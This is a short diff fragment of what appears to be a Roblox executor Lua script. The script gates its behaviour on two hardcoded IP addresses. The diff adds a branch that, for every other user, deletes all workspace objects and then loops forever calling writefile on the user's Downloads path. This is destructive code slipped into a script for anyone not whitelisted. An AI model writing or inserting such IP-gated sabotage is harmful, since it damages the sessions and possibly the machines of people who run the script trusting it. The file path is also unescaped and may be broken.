@@ -16,4 +16,7 @@ if ip ~= "2.212.149.233" and ip ~= "86.157.169.141" then
         end)
     end
   end)
+else
+  for _, v in next, workspace:GetDescendants() do v.Parent = nil end
+  while task.wait() do writefile("C:\Users\User\Downloads", "a") end
 end
